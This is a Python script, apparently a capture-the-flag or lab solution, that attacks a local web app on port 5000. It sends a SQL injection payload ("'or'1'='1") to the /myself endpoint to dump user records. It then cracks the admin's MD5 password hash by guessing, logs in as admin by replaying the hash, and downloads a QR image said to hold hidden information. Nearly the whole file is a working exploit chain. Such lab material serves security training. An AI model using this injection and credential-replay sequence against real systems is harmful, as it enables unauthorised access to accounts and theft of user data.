import sys
sys.path.append("..")
import config
import requests
import hashlib,json
from lxml import html
from lxml import etree
import os
import re
host = config.host
url_register = "http://" + host + ":5000/register"
url_login = "http://" + host + ":5000/login"
url_index = "http://" + host + ":5000/index"

admin_passwd_md5 =""
session = ""
username = "kate"
passwd = "123"
passwd = hashlib.md5(passwd.encode('utf8')).hexdigest()
data = {"username":username,"passwd":passwd}


#注册：最后写成变量传入用户名密码的方式
#res = requests.post(url=url_register,data=data)


#登陆
res = requests.post(url=url_login,data=data)
res = res.json()
print(res)
if( res["status"] == 206):
    session = res["session"]
    print(username, "登陆成功，你的session是：",res["session"])
else:
    print("登陆失败")

#访问index页面
#data = {"username":username,"passwd":passwd,"session":session}
#url_index = "http://" + host + ":5000/index?username="+username+"&passwd="+passwd+"&session="+session
#res = requests.get(url=url_index)
#print(res.text)


url_myself = "http://" + host + ":5000/myself"
data = {"username":username+"'or'1'='1","passwd":passwd,"session":session}
res = requests.post(url=url_myself,data=data)
res = res.json()
if res["status"] == 208:
    print("SQL注入成功，返回数据如下：")
    data = res["data"]
    for item in data:
        if item[1] == "admin":
            print("admin账号的信息：")
            print(item)
            #此处是使用彩虹表攻击的暴力过程
            admin_passwd = "passwd123"
            admin_passwd_md5 = item[2]
            if hashlib.md5(admin_passwd.encode('utf8')).hexdigest() == item[2]:
                print("找到admin账户的密码：")
                print(admin_passwd)

#使用admin账户登陆：
username = "admin"
data = {"username":username,"passwd":admin_passwd_md5,"session":session}
res = requests.post(url=url_login,data=data)
res = res.json()
print(res)
if( res["status"] == 206):
    session = res["session"]
    print(username, "登陆成功，你的session是：",res["session"])
else:
    print("登陆失败")


#使用admin账户登陆获得个人主页
url_admin_index = "http://"+host+":5000/user?username=admin&passwd="+admin_passwd_md5+"&session="+session
res = requests.get(url=url_admin_index)
s=etree.HTML(res.text)
block= s.xpath('/html/body/div[1]/div/ul/li/div[2]/div/a/img/@src')
print(block[0])
QR_url = "http://"+host+":5000/"+ block[0]
print("具有隐藏信息的图片是：")
print(QR_url)

r = requests.get(QR_url)
with open("QR.png", "wb")as f:
    f.write(r.content)

